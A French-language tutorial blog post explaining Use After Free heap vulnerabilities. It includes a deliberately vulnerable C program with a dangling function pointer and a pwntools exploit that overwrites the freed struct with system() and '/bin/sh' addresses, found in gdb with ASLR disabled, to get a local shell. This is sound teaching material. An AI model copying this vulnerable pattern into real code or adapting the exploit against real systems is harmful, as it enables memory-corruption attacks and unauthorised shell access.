---
title: "Use After Free"
date: 2026-05-20 12:00:00 +0200
categories: [Cybersécurité, Documentation, x64, Heap Exploitation]
tags: [pwn, mémoire, exploit]
---
#### Use After Free

Avant toute chose, il est important de savoir ce qu'est un Use After Free ou plus communément appelé "UAF". L'Use After Free est une vulnérabilité qui apparaît lorsqu'un programme continue d'utiliser un pointeur après que la mémoire vers laquelle il pointe a été libérée via la fonction free(). Cette vulnérabilité survient lorsqu'un développeur utilise la fonction malloc() pour allouer un chunk, free() pour le libérer, mais laisse tout de même l'ancien pointeur continuer de pointer vers le chunk libéré, ainsi s'il refait un malloc alors à ce moment l'ancien pointeur pointera toujours vers la zone libérée par free().

Voici un simple programme vulnérable au Use After Free, celui-ci libère la structure mais tente de l'utiliser ensuite :

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

typedef struct {
    void (*func)(char *);
    char *msg;
} cmd_t;

void echo_msg(char *s) {
    printf("Message : %s\n", s);
}

int main() {
    cmd_t *cmd;
    char *input_buffer;

    cmd = malloc(sizeof(cmd_t));
    cmd->func = echo_msg;
    cmd->msg = strdup("Hello World");

    free(cmd->msg);
    free(cmd);

    input_buffer = malloc(sizeof(cmd_t));

    read(0, input_buffer, sizeof(cmd_t));

    cmd->func(cmd->msg);

    return 0;
}
```

Pour cette démonstration, toutes les protections seront activées sauf PIE et l'ASLR. :

* Arch:       amd64-64-little
  RELRO:      Full RELRO
  Stack:      Canary found
  NX:         NX enabled
  PIE:        No PIE (0x400000)
  Stripped:   No

Pour exploiter la faille, il faut tout d'abord s'intéresser un peu à la chronologie de l'attaque :

* Allocation initiale :
  * cmd = malloc();
  * cmd->func = echo_msg;
  * cmd->msg = "Hello World";

Le pointeur cmd stocke donc l'adresse du chunk où se trouvent les pointeurs vers la fonction echo_msg() et le msg "Hello".

* Libération :
  * free(cmd);

Ici même après free de cmd, son pointeur existe toujours, on appelle cela un dangling pointer.

* Réallocation :
  * buffer = malloc();
  * read(0, buffer, sizeof(cmd_t));

Dans un nouveau buffer alloué à l'adresse où l'ancien à été libéré, nous écrivons l'adresse de system() et de "/bin/sh". Mais le pointeur de cmd pointe toujours sur cette adresse.

* Exécution :
  * cmd->func(cmd->msg);

La suite du programme lit le chunk où le pointeur cmd pointe pensant lire l'ancienne structure, ainsi il pointe vers notre nouveau chunk contenant system("/bin/sh") et la fonction l'exécute.

Ainsi pour exploiter cette faille, nous n'avons besoin que de certaines informations trouvables avec gdb :

* l'adresse de base de la libc --> info proc mappings --> 0x00007ffff7db6000
* l'adresse de system() --> p system --> 0x7ffff7e09110
* l'adresse de "/bin/sh" --> find 0x00007ffff7db6000, +20000000, "/bin/sh" --> 0x7ffff7f5dea4

Il ne reste maintenant plus qu'à exploiter la faille pour obtenir un shell :

```
from pwn import *

exe = ELF('./exploit')
context.binary = exe

p = process(exe.path)

system_addr = 0x7ffff7e09110
binsh_addr = 0x7ffff7f5dea4

payload = flat(
    system_addr,
    binsh_addr
)

p.clean()

p.send(payload)

p.interactive()
```

Le programme vulnérable effectuant déjà l'entiereté de l'attaque, nous n'avons qu'à remplir un nouveau buffer contenant l'adresse de system() et "/bin/sh" et le programme vulnérable se chargera de l'exécuter avec le dangling pointer.

Pour rappel le code vulnérable ainsi que son exploit ne sont que de simples démonstrations de la vulnérabilité.
